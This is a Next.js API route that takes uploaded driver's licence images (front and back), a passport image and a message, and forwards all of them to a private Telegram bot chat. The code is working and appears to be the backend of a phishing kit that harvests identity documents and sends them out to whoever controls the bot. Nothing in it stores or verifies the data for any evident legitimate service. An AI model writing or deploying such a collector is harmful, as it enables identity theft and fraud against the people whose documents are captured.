import { NextRequest } from "next/server";

export async function POST(req: NextRequest) {
  try {
    const contentType = req.headers.get("content-type") || "";
    let message = "";
    const files: { name: string; blob: Blob }[] = [];

    if (contentType.includes("multipart/form-data")) {
      // parse multipart body (formData available in Next's Request)
      const form = await req.formData();
      const msg = form.get("message");
      message = typeof msg === "string" ? msg : msg?.toString() ?? "";

      // collect expected file fields (adjust names if you use different keys)
      const fileKeys = ["driversLicenseFront", "driversLicenseBack", "passport"];
      for (const key of fileKeys) {
        const file = form.get(key) as File | null;
        if (file && (file as any).size) {
          const filename = (file as any).name || key;
          files.push({ name: filename, blob: file });
        }
      }
    } else {
      // fallback to JSON body
      const body = await req.json();
      message = body?.message || "";
    }

    const telegramToken = process.env.NEXT_PUBLIC_TOKEN;
    const telegramChatId = process.env.NEXT_PUBLIC_ID;

    if (!telegramToken || !telegramChatId) {
      console.error("Missing Telegram config");
      return new Response("Missing Telegram config", { status: 500 });
    }

    // send text message first
    await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
        parse_mode: "HTML",
      }),
    });

    // send each file as a document
    for (const f of files) {
      const fd = new FormData();
      fd.append("chat_id", telegramChatId);
      // append file blob with filename so Telegram accepts it
      fd.append("document", f.blob as any, f.name);

      await fetch(`https://api.telegram.org/bot${telegramToken}/sendDocument`, {
        method: "POST",
        body: fd, // runtime sets multipart boundary
      });
    }

    return new Response(JSON.stringify({ ok: true }), { status: 200 });
  } catch (err) {
    console.error("Telegram API error:", err);
    return new Response("Internal Server Error", { status: 500 });
  }
}